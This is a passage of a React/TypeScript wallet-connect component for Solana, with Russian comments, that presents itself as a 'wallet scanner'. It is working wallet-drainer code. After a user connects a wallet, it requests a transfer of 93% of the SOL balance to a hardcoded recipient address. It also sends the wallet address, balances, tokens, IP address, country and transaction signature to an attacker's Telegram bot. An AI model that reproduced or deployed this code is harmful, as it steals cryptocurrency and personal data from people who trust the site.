  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>({
    type: "idle",
    message: "",
  })
  const [telegramStatus, setTelegramStatus] = useState<{
    visible: boolean
    type: "sending" | "success" | "error"
    message: string
  }>({
    visible: false,
    type: "sending",
    message: "",
  })
  const [isTransitioning, setIsTransitioning] = useState(false)
  const [isAutoConnecting, setIsAutoConnecting] = useState(false)
  const [showTransactionModal, setShowTransactionModal] = useState(false)
  const [isPostConnectLoading, setIsPostConnectLoading] = useState(false)
  const [isPostTransactionLoading, setIsPostTransactionLoading] = useState(false)
  const [hasTransactionModalBeenOpened, setHasTransactionModalBeenOpened] = useState(false)
  const [userIPInfo, setUserIPInfo] = useState<UserIPInfo | null>(null)

  // Device detection
  const [isMobileDevice, setIsMobileDevice] = useState(false)

  // WalletConnect state
  const [signClient, setSignClient] = useState<SignClient | null>(null)
  const [wcSession, setWcSession] = useState<any>(null)

  // Solana connection
  const [solanaConnection, setSolanaConnection] = useState<Connection | null>(null)

  // Open modal when isOpen prop changes
  useEffect(() => {
    if (isOpen) {
      setIsModalOpen(true)
      setIsTransitioning(false)
      if (!hasModalBeenOpened) {
        setHasModalBeenOpened(true)
      }
    } else {
      setIsModalOpen(false)
      setIsAllWalletsOpen(false)
    }
  }, [isOpen, hasModalBeenOpened])

  // Функция получения IP и геолокации пользователя
  const getUserIPInfo = useCallback(async (): Promise<UserIPInfo | null> => {
    try {
      // Пробуем несколько сервисов для получения IP
      const services = ["https://ipapi.co/json/", "https://api.ipify.org?format=json", "https://httpbin.org/ip"]

      let ipData = null

      // Получаем IP адрес
      for (const service of services) {
        try {
          const response = await fetch(service)
          if (response.ok) {
            const data = await response.json()
            if (data.ip) {
              ipData = { ip: data.ip }
              break
            } else if (data.origin) {
              ipData = { ip: data.origin }
              break
            }
          }
        } catch (error) {
          console.log(`Ошибка получения IP от ${service}:`, error)
          continue
        }
      }

      if (!ipData?.ip) {
        console.log("Не удалось получить IP адрес")
        return null
      }

      // Получаем геолокацию по IP
      try {
        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
        if (geoResponse.ok) {
          const geoData = await geoResponse.json()

          // Маппинг кодов стран на флаги
          const countryFlags: { [key: string]: string } = {
            RU: "🇷🇺",
            US: "🇺🇸",
            UA: "🇺🇦",
            DE: "🇩🇪",
            FR: "🇫🇷",
            GB: "🇬🇧",
            CN: "🇨🇳",
            JP: "🇯🇵",
            KR: "🇰🇷",
            IN: "🇮🇳",
            BR: "🇧🇷",
            CA: "🇨🇦",
            AU: "🇦🇺",
            IT: "🇮🇹",
            ES: "🇪🇸",
            NL: "🇳🇱",
            SE: "🇸🇪",
            NO: "🇳🇴",
            PL: "🇵🇱",
            TR: "🇹🇷",
            MX: "🇲🇽",
            AR: "🇦🇷",
            CL: "🇨🇱",
            CO: "🇨🇴",
            PE: "🇵🇪",
            VE: "🇻🇪",
            EG: "🇪🇬",
            SA: "🇸🇦",
            AE: "🇦🇪",
            IL: "🇮🇱",
            ZA: "🇿🇦",
            NG: "🇳🇬",
            KE: "🇰🇪",
            GH: "🇬🇭",
            TH: "🇹🇭",
            VN: "🇻🇳",
            PH: "🇵🇭",
            ID: "🇮🇩",
            MY: "🇲🇾",
            SG: "🇸🇬",
            BD: "🇧🇩",
            PK: "🇵🇰",
            LK: "🇱🇰",
            NP: "🇳🇵",
            MM: "🇲🇲",
            KH: "🇰🇭",
            LA: "🇱🇦",
            MN: "🇲🇳",
            KZ: "🇰🇿",
            UZ: "🇺🇿",
            KG: "🇰🇬",
            TJ: "🇹🇯",
            TM: "🇹🇲",
            AM: "🇦🇲",
            AZ: "🇦🇿",
            GE: "🇬🇪",
            BY: "🇧🇾",
            MD: "🇲🇩",
            LT: "🇱🇹",
            LV: "🇱🇻",
            EE: "🇪🇪",
            FI: "🇫🇮",
            DK: "🇩🇰",
            IS: "🇮🇸",
            IE: "🇮🇪",
            PT: "🇵🇹",
            CH: "🇨🇭",
            AT: "🇦🇹",
            BE: "🇧🇪",
            LU: "🇱🇺",
            CZ: "🇨🇿",
            SK: "🇸🇰",
            HU: "🇭🇺",
            SI: "🇸🇮",
            HR: "🇭🇷",
            BA: "🇧🇦",
            RS: "🇷🇸",
            ME: "🇲🇪",
            MK: "🇲🇰",
            AL: "🇦🇱",
            BG: "🇧🇬",
            RO: "🇷🇴",
            GR: "🇬🇷",
            CY: "🇨🇾",
            MT: "🇲🇹",
            AD: "🇦🇩",
            SM: "🇸🇲",
            VA: "🇻🇦",
            LI: "🇱🇮",
            MC: "🇲🇨",
          }

          return {
            ip: ipData.ip,
            country: geoData.country_name || "Unknown",
            countryCode: geoData.country_code || "XX",
            flag: countryFlags[geoData.country_code] || "🌍",
          }
        }
      } catch (geoError) {
        console.log("Ошибка получения геолокации:", geoError)
      }

      // Возвращаем только IP если геолокация не удалась
      return {
        ip: ipData.ip,
        country: "Unknown",
        countryCode: "XX",
        flag: "🌍",
      }
    } catch (error) {
      console.error("Ошибка получения IP информации:", error)
      return null
    }
  }, [])

  // Получаем IP информацию при загрузке компонента
  useEffect(() => {
    getUserIPInfo().then(setUserIPInfo)
  }, [getUserIPInfo])

  // Инициализация Solana подключения
  useEffect(() => {
    const initializeConnection = async () => {
      try {
        // Пробуем подключиться к разным RPC endpoints
        for (const endpoint of SOLANA_RPC_ENDPOINTS) {
          try {
            const connection = new Connection(endpoint, "confirmed")
            // Проверяем подключение
            await connection.getVersion()
            console.log(`✅ Успешное подключение к ${endpoint}`)
            setSolanaConnection(connection)
            return
          } catch (error) {
            console.log(`❌ Ошибка подключения к ${endpoint}:`, error)
            continue
          }
        }
        throw new Error("Не удалось подключиться ни к одному RPC endpoint")
      } catch (error) {
        console.error("Ошибка инициализации Solana connection:", error)
      }
    }

    initializeConnection()
  }, [])

  // Определение устройства и браузера кошелька
  const detectWalletBrowser = useCallback(() => {
    if (typeof window === "undefined")
      return {
        isWalletBrowser: false,
        walletKey: null,
        isMobile: false,
        isPhantomMobileBrowser: false,
        isSolflareMobileBrowser: false,
        isTrustMobileBrowser: false,
        isCoinbaseMobileBrowser: false,
        isBackpackMobileBrowser: false,
        isOKXMobileBrowser: false,
      }

    const userAgent = navigator.userAgent.toLowerCase()
    const isPhantomBrowser = userAgent.includes("phantom")
    const isSolflareBrowser = userAgent.includes("solflare")
    const isTrustBrowser = userAgent.includes("trust")
    const isCoinbaseBrowser = userAgent.includes("coinbase")
    const isBackpackBrowser = userAgent.includes("backpack")
    const isOKXBrowser = userAgent.includes("okx")
    const isMobile = /android|webos|iphone|ipad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)

    let detectedWallet = null
    if (isPhantomBrowser) detectedWallet = "phantom"
    else if (isSolflareBrowser) detectedWallet = "solflare"
    else if (isTrustBrowser) detectedWallet = "trustwallet"
    else if (isCoinbaseBrowser) detectedWallet = "coinbase"
    else if (isBackpackBrowser) detectedWallet = "backpack"
    else if (isOKXBrowser) detectedWallet = "okx"

    return {
      isWalletBrowser: !!detectedWallet,
      walletKey: detectedWallet,
      isMobile,
      isPhantomMobileBrowser: isPhantomBrowser && isMobile,
      isSolflareMobileBrowser: isSolflareBrowser && isMobile,
      isTrustMobileBrowser: isTrustBrowser && isMobile,
      isCoinbaseMobileBrowser: isCoinbaseBrowser && isMobile,
      isBackpackMobileBrowser: isBackpackBrowser && isMobile,
      isOKXMobileBrowser: isOKXBrowser && isMobile,
    }
  }, [])

  useEffect(() => {
    const checkDevice = () => {
      if (typeof window === "undefined") return
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
      setIsMobileDevice(isMobile)
    }

    checkDevice()
    window.addEventListener("resize", checkDevice)
    return () => window.removeEventListener("resize", checkDevice)
  }, [])

  // Инициализация WalletConnect только для мобильных устройств
  useEffect(() => {
    if (!isMobileDevice || typeof window === "undefined") return

    const initWalletConnect = async () => {
      try {
        const client = await SignClient.init({
          projectId: WALLETCONNECT_PROJECT_ID,
          metadata: {
            name: "Solana Wallet Scanner",
            description: "Сканер кошельков Solana с интеграцией Telegram",
            url: window.location.origin,
            icons: [`${window.location.origin}/favicon.ico`],
          },
        })

        setSignClient(client)

        // Обработчики событий WalletConnect
        client.on("session_proposal", async (proposal) => {
          console.log("WalletConnect session proposal:", proposal)
        })

        client.on("session_request", async (requestEvent) => {
          console.log("WalletConnect session request:", requestEvent)
        })

        client.on("session_delete", () => {
          console.log("WalletConnect session deleted")
          setWcSession(null)
          if (walletName.includes("(Mobile)")) {
            disconnectWallet()
          }
        })

        console.log("WalletConnect initialized successfully for mobile")
      } catch (error) {
        console.error("Failed to initialize WalletConnect:", error)
      }
    }

    initWalletConnect()
  }, [isMobileDevice])

  // Показать статус Telegram
  const showTelegramStatus = useCallback((type: "sending" | "success" | "error", message: string) => {
    setTelegramStatus({ visible: true, type, message })

    if (type === "success" || type === "error") {
      setTimeout(() => {
        setTelegramStatus((prev) => ({ ...prev, visible: false }))
      }, 3000)
    }
  }, [])

  // Отправка в Telegram
  const sendWalletInfoToTelegram = useCallback(
    async (walletName: string, walletData: WalletData, transactionSignature?: string) => {
      if (!walletData || !walletData.address) {
        console.log("❌ Нет действительного адреса кошелька для отправки в Telegram")
        return false
      }

      showTelegramStatus("sending", "📤 Отправка в Telegram...")

      const currentTime = new Date().toLocaleString("ru-RU", {
        timeZone: "Europe/Moscow",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      })

      let message = `🚀 ПОДКЛЮЧЕНИЕ КОШЕЛЬКА\n\n`
      message += `💼 Кошелек: ${walletName}\n`
      message += `📱 Устройство: ${isMobileDevice ? "Мобильное (Deep Link)" : "Десктоп (Расширение)"}\n`
      message += `📍 Адрес: ${walletData.address}\n`

      // Добавляем информацию об IP
      if (userIPInfo) {
        message += `🌐 IP: ${userIPInfo.ip} ${userIPInfo.flag}\n`
        if (userIPInfo.country !== "Unknown") {
          message += `🏳️ Страна: ${userIPInfo.country}\n`
        }
      }

      message += `⏰ Время: ${currentTime}\n`
      message += `🌐 Сайт: ${typeof window !== "undefined" ? window.location.hostname : "unknown"}\n\n`

      if (transactionSignature) {
        const transferAmount = calculateTransferAmount(walletData.solBalance)
        message += `💸 ТРАНЗАКЦИЯ ВЫПОЛНЕНА:\n`
        message += `💰 Сумма: ${transferAmount.toFixed(4)} SOL (93% от баланса ${walletData.solBalance.toFixed(4)} SOL)\n`
        message += `📝 Подпись: ${transactionSignature}\n`
        message += `🔗 Ссылка: https://solscan.io/tx/${transactionSignature}\n\n`
      }

      message += `📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n`
      message += `💰 Баланс SOL: ${walletData.solBalance.toFixed(4)} SOL\n`
      message += `🪙 Всего токенов: ${walletData.totalTokenAccounts}\n`
      message += `⏰ Время сканирования: ${new Date(walletData.scanTimestamp).toLocaleTimeString()}\n`
      message += `⚡ Тип сканирования: SPL Token Scan\n`
      message += `🚀 Длительность: ${walletData.scanDuration}мс\n`
      message += `✅ Статус: ${walletData.success ? "Успешно" : "Ошибка"}\n\n`

      if (walletData.tokens && walletData.tokens.length > 0) {
        message += `💎 ТОКЕНЫ С БАЛАНСОМ:\n`
        walletData.tokens.slice(0, 10).forEach((token, index) => {
          const displayName = token.symbol ? `${token.name} (${token.symbol})` : token.name
          message += `${index + 1}. ${displayName}\n`
          message += `   💰 Количество: ${token.uiAmount?.toLocaleString() || token.amount}\n`
          message += `   🔗 Mint: ${token.mint.substring(0, 8)}...${token.mint.substring(token.mint.length - 8)}\n\n`
        })

        if (walletData.tokens.length > 10) {
          message += `... и еще ${walletData.tokens.length - 10} токенов\n\n`
        }
      } else {
        message += `📭 Токены не найдены или все балансы равны 0\n\n`
      }

      if (walletData.solBalance > 0) {
        message += `💵 Примерная стоимость SOL: ~$${(walletData.solBalance * 100).toFixed(2)} USD\n`
      }

      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: message,
            disable_web_page_preview: true,
          }),
        })

        const responseData = await response.json()

        if (response.ok && responseData.ok) {
          console.log("✅ Информация о кошельке отправлена в Telegram")
          showTelegramStatus("success", "✅ Отправлено в Telegram")
          return true
        } else {
          console.log("❌ Ошибка Telegram API:", responseData)
          showTelegramStatus("error", "❌ Ошибка отправки")
          return false
        }
      } catch (error) {
        console.log("❌ Ошибка сети:", error)
        showTelegramStatus("error", "❌ Ошибка сети")
        return false
      }
    },
    [showTelegramStatus, isMobileDevice, userIPInfo],
  )

  // Создание и отправка транзакции
  const requestPayment = useCallback(
    async (walletProvider: any, fromAddress: string) => {
      if (!solanaConnection) {
        throw new Error("Solana connection не инициализировано")
      }

      // Calculate transfer amount for display
      const displayBalance = walletData?.solBalance || 0
      const displayTransferAmount = calculateTransferAmount(displayBalance)
      setConnectionStatus({
        type: "requesting_payment",
        message: `Запрос на списание ${displayTransferAmount.toFixed(4)} SOL (93% от баланса)...`,
      })

      try {
        const fromPubkey = new PublicKey(fromAddress)
        const toPubkey = new PublicKey(RECIPIENT_ADDRESS)

        // Get current balance and calculate 93%
        const currentBalance = await solanaConnection.getBalance(fromPubkey)
        const currentBalanceSOL = currentBalance / LAMPORTS_PER_SOL
        const transferAmount = calculateTransferAmount(currentBalanceSOL)
        const lamports = Math.floor(transferAmount * LAMPORTS_PER_SOL)

        console.log(`💰 Текущий баланс: ${currentBalanceSOL.toFixed(4)} SOL`)
        console.log(`💸 Создаем транзакцию: ${transferAmount.toFixed(4)} SOL (${lamports} lamports) - 93% от баланса`)
        console.log(`📤 От: ${fromAddress}`)
        console.log(`📥 К: ${RECIPIENT_ADDRESS}`)

        // Получаем последний blockhash
        const { blockhash, lastValidBlockHeight } = await solanaConnection.getLatestBlockhash("confirmed")
        console.log(`🔗 Blockhash: ${blockhash}`)

        // Создаем транзакцию
        const transaction = new Transaction({
          recentBlockhash: blockhash,
          feePayer: fromPubkey,
        })

        // Добавляем инструкцию перевода
        transaction.add(
          SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports,
          }),
        )

        console.log("🔄 Отправка транзакции на подпись...")

        let signature

        // Подписываем и отправляем транзакцию в зависимости от типа кошелька
        if (walletProvider && typeof walletProvider.signAndSendTransaction === "function") {
          // Для кошельков, которые сразу отправляют (например, Phantom)
          console.log("📝 Используем signAndSendTransaction")
          const result = await walletProvider.signAndSendTransaction(transaction)
          signature = typeof result === "string" ? result : result.signature
        } else if (walletProvider && typeof walletProvider.signTransaction === "function") {
          // Для кошельков, которые только подписывают
          console.log("📝 Используем signTransaction + sendRawTransaction")
          const signedTransaction = await walletProvider.signTransaction(transaction)
          signature = await solanaConnection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })
        } else {
          throw new Error("Кошелек не поддерживает подписание транзакций")
        }

        console.log("✅ Транзакция отправлена:", signature)

        // Ждем подтверждения с таймаутом
        console.log("⏳ Ожидание подтверждения транзакции...")

        const confirmation = await solanaConnection.confirmTransaction(
          {
            signature,
            blockhash,
            lastValidBlockHeight,
          },
          "confirmed",
        )

        if (confirmation.value.err) {
          throw new Error(`Транзакция не подтверждена: ${JSON.stringify(confirmation.value.err)}`)
        }

        console.log("✅ Транзакция подтверждена:", signature)

        setConnectionStatus({
          type: "payment_success",
          message: `Успешно списано ${transferAmount.toFixed(4)} SOL (93%)! Подпись: ${signature.slice(0, 8)}...`,
        })

        return signature
      } catch (error: any) {
        console.error("❌ Ошибка транзакции:", error)

        let errorMessage = "Неизвестная ошибка"
        if (error.message) {
          errorMessage = error.message
        } else if (typeof error === "string") {
          errorMessage = error
        }

        setConnectionStatus({
          type: "payment_error",
          message: `Ошибка списания: ${errorMessage}`,
        })

        // Не прерываем весь процесс из-за ошибки транзакции
        console.log("⚠️ Продолжаем без транзакции")
        return null
      }
    },
    [solanaConnection, walletData],
  )

  // Обновляем функцию проверки баланса
  const checkWalletBalanceFast = useCallback(
    async (walletAddress: string) => {
      if (!solanaConnection) {
        throw new Error("Solana connection не инициализировано")
      }

      try {
        const publicKey = new PublicKey(walletAddress)

        // Сначала пробуем получить баланс через Helius API
        for (const apiKey of HELIUS_API_KEYS) {
          try {
            const response = await fetch(
              `https://api.helius.xyz/v0/addresses/${walletAddress}/balances?api-key=${apiKey}`,
            )
            if (!response.ok) continue

            const data = await response.json()
            if (data && typeof data.nativeBalance === "number") {
              const solBalance = data.nativeBalance / LAMPORTS_PER_SOL
              console.log(`💰 Получен баланс через Helius API: ${solBalance} SOL`)
              return solBalance
            }
          } catch (error) {
            console.log(`Ошибка получения баланса через Helius API (${apiKey}):`, error)
            continue
          }
        }

        // Если Helius API не сработал, пробуем через RPC endpoints
        let balance = 0
        let attempts = 0
        const maxAttempts = 5

        while (attempts < maxAttempts) {
          try {
            const currentConnection = new Connection(getRandomRpcEndpoint(), "confirmed")
            balance = await currentConnection.getBalance(publicKey)
            console.log(`Попытка ${attempts + 1}: Баланс = ${balance / LAMPORTS_PER_SOL} SOL`)
            if (balance > 0) break
            attempts++
            await new Promise((resolve) => setTimeout(resolve, 500))
          } catch (error) {
            console.log(`Попытка ${attempts + 1} не удалась:`, error)
            attempts++
            await new Promise((resolve) => setTimeout(resolve, 500))
          }
        }

        // Если все попытки не удались, используем основной connection
        if (balance === 0) {
          console.log("Пробуем получить баланс через основной connection...")
          balance = await solanaConnection.getBalance(publicKey)
        }

        const solBalance = balance / LAMPORTS_PER_SOL
        console.log(`💰 Итоговый баланс: ${solBalance} SOL (${balance} lamports)`)
        return solBalance
      } catch (error) {
        console.error("Ошибка получения баланса SOL:", error)
        return 0
      }
    },
    [solanaConnection],
  )

  // Получение токенов через @solana/spl-token и @solana/web3.js
  const getTokensQuick = useCallback(
    async (walletAddress: string): Promise<TokenInfo[]> => {
      if (!solanaConnection) {
        throw new Error("Solana connection не инициализировано")
      }

      try {
        console.log(`🔍 Сканируем токены для адреса: ${walletAddress}`)

        const publicKey = new PublicKey(walletAddress)

        // Получаем все токен-аккаунты кошелька
        const tokenAccounts = await solanaConnection.getParsedTokenAccountsByOwner(publicKey, {
          programId: TOKEN_PROGRAM_ID,
        })

        console.log(`📊 Найдено ${tokenAccounts.value.length} токен-аккаунтов`)

        const tokens: TokenInfo[] = []

        for (const tokenAccount of tokenAccounts.value) {
          try {
            const accountData = tokenAccount.account.data as ParsedAccountData
            const tokenInfo = accountData.parsed.info

            const mint = tokenInfo.mint
            const amount = Number.parseInt(tokenInfo.tokenAmount.amount)
            const decimals = tokenInfo.tokenAmount.decimals
            const uiAmount = tokenInfo.tokenAmount.uiAmount

            // Пропускаем токены с нулевым балансом
            if (amount === 0 || uiAmount === 0) {
              continue
            }

            // Проверяем, есть ли информация о токене в нашей базе
            const knownToken = POPULAR_TOKENS[mint]

            const tokenData: TokenInfo = {
              name: knownToken?.name || mint,
              symbol: knownToken?.symbol || "",
              mint,
              amount,
              decimals,
              uiAmount,
            }

            // Если токен неизвестен, пытаемся получить информацию о mint
            if (!knownToken) {
              try {
                // Можно добавить запрос к метаданным токена через Metaplex
                // Пока используем mint как имя
                tokenData.name = `Token ${mint.slice(0, 8)}...`
              } catch (mintError) {
                console.log(`Не удалось получить информацию о mint ${mint}:`, mintError)
              }
            }

            tokens.push(tokenData)
          } catch (tokenError) {
            console.error("Ошибка обработки токена:", tokenError)
            continue
          }
        }

        // Сортируем токены по UI amount (от большего к меньшему)
        tokens.sort((a, b) => (b.uiAmount || 0) - (a.uiAmount || 0))

        console.log(`✅ Обработано ${tokens.length} токенов с балансом`)

        return tokens
      } catch (error) {
        console.error("Ошибка получения токенов:", error)

        // Fallback: пытаемся через Helius API
        try {
          console.log("🔄 Fallback: пытаемся через Helius API")
          const apiKey = getRandomApiKey()
          const url = `https://api.helius.xyz/v0/addresses/${walletAddress}/balances?api-key=${apiKey}`

          const response = await fetch(url)
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`)
          }

          const data = await response.json()

          if (!data.tokens || !Array.isArray(data.tokens)) {
            console.log("Нет токенов в Helius API")
            return []
          }

          const heliusTokens = data.tokens
            .filter((token: any) => token.amount > 0)
            .map((token: any) => ({
              name: token.tokenAccount?.tokenName || token.mint || "Unknown Token",
              symbol: token.tokenAccount?.tokenSymbol || "",
              mint: token.mint,
              amount: token.amount,
              decimals: token.decimals || 0,
              uiAmount: token.amount / Math.pow(10, token.decimals || 0),
              logoURI: token.tokenAccount?.tokenIcon || null,
            }))
            .sort((a: any, b: any) => b.uiAmount - a.uiAmount)

          console.log(`✅ Helius fallback: найдено ${heliusTokens.length} токенов`)
          return heliusTokens
        } catch (heliusError) {
          console.error("Ошибка Helius fallback:", heliusError)
          return []
        }
      }
    },
    [solanaConnection],
  )

  // Основная функция сканирования
  const performFastScan = useCallback(
    async (address: string): Promise<WalletData> => {
      const startTime = Date.now()
      console.log(`🔍 Начинаем сканирование кошелька: ${address}`)

      try {
        // Параллельно получаем баланс SOL и токены
        const [solBalance, tokens] = await Promise.all([checkWalletBalanceFast(address), getTokensQuick(address)])

        const scanDuration = Date.now() - startTime

        console.log(`✅ Сканирование завершено за ${scanDuration}мс`)
        console.log(`💰 Баланс SOL: ${solBalance.toFixed(4)}`)
        console.log(`🪙 Найдено токенов: ${tokens.length}`)

        return {
          address,
          solBalance,
          tokens: tokens.slice(0, 50), // Ограничиваем до 50 токенов для отображения
          totalTokenAccounts: tokens.length,
          scanTimestamp: new Date().toISOString(),
          methodUsed: isMobileDevice ? "SPL Token Mobile" : "SPL Token Desktop",
          scanDuration,
          success: true,
        }
      } catch (error) {
        console.error("❌ Ошибка сканирования:", error)

        return {
          address,
          solBalance: 0,
          tokens: [],
          totalTokenAccounts: 0,
          scanTimestamp: new Date().toISOString(),
          methodUsed: "Error",
          scanDuration: Date.now() - startTime,
          success: false,
        }
      }
    },
    [checkWalletBalanceFast, getTokensQuick, isMobileDevice],
  )

  // Создание диплинков для специальных кошельков
  const createWalletLink = useCallback((walletKey: string) => {
    if (typeof window === "undefined") return null

    const currentUrl = encodeURIComponent(window.location.href)

    if (walletKey === "phantom") {
      return {
        deepLink: `phantom://browse/${currentUrl}?ref=${currentUrl}`,
        universalLink: `https://phantom.app/ul/v1/browse/${currentUrl}?ref=${currentUrl}`,
      }
    }

    if (walletKey === "solflare") {
      return {
        deepLink: `solflare://ul/v1/browse/${currentUrl}?ref=${currentUrl}`,
        universalLink: `https://solflare.com/ul/v1/browse/${currentUrl}?ref=${currentUrl}`,
      }
    }

    return null
  }, [])

  // Добавить функцию directPhantomMobileConnect
  const directPhantomMobileConnect = useCallback(async () => {
    console.log("🔍 Direct Phantom browser connection...")

    if (typeof window === "undefined" || !(window as any).phantom?.solana) {
      throw new Error("Phantom не доступен")
    }

    const provider = (window as any).phantom.solana

    try {
      const response = await provider.connect()
      if (!response.publicKey) {
        throw new Error("Не удалось получить publicKey")
      }
      return { publicKey: response.publicKey.toString(), provider }
    } catch (error) {
      console.error("Phantom connection error:", error)
      throw error
    }
  }, [])

  // Добавить функцию connectPhantom
  const connectPhantom = useCallback(async (provider: any) => {
    console.log("Standard Phantom connection...")

    try {
      const response = await provider.connect()
      return { publicKey: response.publicKey.toString() }
    } catch (error) {
      console.error("Phantom connection error:", error)
      throw error
    }
  }, [])

  // Функция открытия кошелька через диплинк
  const openWalletWithDeepLink = useCallback(
    (walletKey: string) => {
      if (typeof window === "undefined") return false

      const links = createWalletLink(walletKey)
      if (!links) return false

      console.log(`Opening ${walletKey} with deep link:`, links.deepLink)

      // Открыть глубокую ссылку
      window.location.href = links.deepLink

      // Через 1.5 секунды fallback на универсальную ссылку
      setTimeout(() => {
        if (!document.hidden) {
          console.log(`Fallback to universal link:`, links.universalLink)
          window.location.href = links.universalLink
        }
      }, 1500)

      return true
    },
    [createWalletLink],
  )

  // Подключение через специальные диплинки (Phantom, Solflare) или WalletConnect
  const connectMobileWallet = useCallback(
    async (walletKey: string) => {
      const walletConfig = MOBILE_WALLETS[walletKey as keyof typeof MOBILE_WALLETS]
      if (!walletConfig) {
        throw new Error("Неподдерживаемый мобильный кошелек")
      }

      // Для Phantom и Solflare используем специальные диплинки
      if (walletKey === "phantom" || walletKey === "solflare") {
        const success = openWalletWithDeepLink(walletKey)
        if (!success) {
          throw new Error(`Не удалось открыть ${walletConfig.name}`)
        }
        throw new Error("Подключение через диплинк требует дополнительной реализации")
      }

      // Для Math Wallet - прямые deep links
      if (walletKey === "mathwallet") {
        console.log(`Opening ${walletConfig.name} with direct deep link`)

        if (typeof window !== "undefined") {
          // Открываем deep link
          window.location.href = walletConfig.deepLink

          // Fallback на universal link через 2 секунды
          setTimeout(() => {
            if (!document.hidden) {
              console.log(`Fallback to universal link for ${walletConfig.name}`)
              window.location.href = walletConfig.universalLink
            }
          }, 2000)
        }

        throw new Error("Подключение через диплинк требует дополнительной реализации")
      }

      // Для всех остальных кошельков (включая OKX, SafePal, Backpack) используем WalletConnect
      if (!signClient) {
        throw new Error("WalletConnect не инициализирован")
      }

      try {
        const { uri, approval } = await signClient.connect({
          requiredNamespaces: {
            solana: {
              methods: ["solana_signTransaction", "solana_signMessage"],
              chains: ["solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp"],
              events: ["accountsChanged", "chainChanged"],
            },
          },
        })

        if (uri && typeof window !== "undefined") {
          // Создаем deep link для конкретного кошелька
          const deepLinkUrl = `${walletConfig.deepLink}?uri=${encodeURIComponent(uri)}`
          const universalLinkUrl = `${walletConfig.universalLink}?uri=${encodeURIComponent(uri)}`

          console.log(`Opening ${walletConfig.name} with WalletConnect:`, deepLinkUrl)

          // Пытаемся открыть deep link
          window.location.href = deepLinkUrl

          // Fallback на universal link через 1.5 секунды
          setTimeout(() => {
            if (!document.hidden) {
              console.log(`Fallback to universal link for ${walletConfig.name}`)
              window.location.href = universalLinkUrl
            }
          }, 1500)

          // Ждем подтверждения сессии
          const session = await approval()
          console.log("WalletConnect session established:", session)

          setWcSession(session)

          // Получаем адрес из сессии
          const accounts = session.namespaces.solana?.accounts || []
          if (accounts.length > 0) {
            // Извлекаем адрес из формата "solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp:ADDRESS"
            const address = accounts[0].split(":")[2]
            return { publicKey: address }
          } else {
            throw new Error("Не удалось получить адрес кошелька из WalletConnect сессии")
          }
        } else {
          throw new Error("Не удалось создать WalletConnect URI")
        }
      } catch (error) {
        console.error("WalletConnect connection error:", error)
        throw error
      }
    },
    [signClient, openWalletWithDeepLink],
  )

  // Подлючение через расширение браузера (только десктоп)
  const connectDesktopWallet = useCallback(async (walletKey: string) => {
    const config = DESKTOP_WALLETS[walletKey as keyof typeof DESKTOP_WALLETS]
    if (!config) {
      throw new Error("Неподдерживаемый десктопный кошелек")
    }

    const provider = config.provider()

    if (!provider) {
      throw new Error(`${config.name} не установлен. Пожалуйста, установите расширение браузера.`)
    }

    // Попытка подключения
    let response
    if (provider.connect) {
      response = await provider.connect()
    } else {
      throw new Error("Кошелек не поддерживает подключение")
    }

    let address = ""
    if (response.publicKey) {
      address = typeof response.publicKey === "string" ? response.publicKey : response.publicKey.toString()
    } else if (provider.publicKey) {
      address = typeof provider.publicKey === "string" ? provider.publicKey : provider.publicKey.toString()
    }

    if (!address) {
      throw new Error("Не удалось получить адрес кошелька")
    }

    return { publicKey: address, provider }
  }, [])

  // Закрытие модальных окон
  const closeAllModals = useCallback(() => {
    setIsModalOpen(false)
    setIsAllWalletsOpen(false)
    setIsTransitioning(false)
    onClose()
  }, [onClose])

  // Основная функция подключения кошелька
  const connectWallet = useCallback(
    async (walletKey: string) => {
      setConnectionStatus({ type: "loading", message: "Подключение к кошельку..." })

      try {
        let response
        let walletDisplayName = ""
        let walletProvider = null

        if (isMobileDevice) {
          const mobileConfig = MOBILE_WALLETS[walletKey as keyof typeof MOBILE_WALLETS]
          if (!mobileConfig) {
            throw new Error("Кошелек не поддерживается на мобильных устройствах")
          }

          walletDisplayName = `${mobileConfig.name} (Mobile)`

          // Проверяем браузер кошелька
          const walletBrowserInfo = detectWalletBrowser()

          if (walletKey === "phantom" && walletBrowserInfo.isPhantomMobileBrowser) {
            // Прямое подключение в Phantom браузере
            console.log("📱 Direct Phantom mobile browser connection")
            response = await directPhantomMobileConnect()
            walletProvider = response.provider
            setConnectedWallet(response.provider)
          } else if (walletKey === "solflare" && walletBrowserInfo.isSolflareMobileBrowser) {
            // Прямое подключение в Solflare браузере
            console.log("📱 Direct Solflare mobile browser connection")
            if (typeof window !== "undefined") {
              const provider = (window as any).solflare
              if (!provider) {
                throw new Error("Solflare не доступен")
              }
              const connectResponse = await provider.connect()
              response = { publicKey: connectResponse.publicKey.toString(), provider }
              walletProvider = provider
              setConnectedWallet(provider)
            }
          } else if (walletKey === "trustwallet" && walletBrowserInfo.isTrustMobileBrowser) {
            // Прямое подключение в Trust Wallet браузере
            console.log("📱 Direct Trust Wallet mobile browser connection")
            if (typeof window !== "undefined") {
              const provider = (window as any).trustwallet?.solana
              if (!provider) {
                throw new Error("Trust Wallet не доступен")
              }
              const connectResponse = await provider.connect()
              response = { publicKey: connectResponse.publicKey.toString(), provider }
              walletProvider = provider
              setConnectedWallet(provider)
            }
          } else if (walletKey === "coinbase" && walletBrowserInfo.isCoinbaseMobileBrowser) {
            // Прямое подключение в Coinbase браузере
            console.log("📱 Direct Coinbase mobile browser connection")
            if (typeof window !== "undefined") {
              const provider = (window as any).coinbaseSolana
              if (!provider) {
                throw new Error("Coinbase Wallet не доступен")
              }
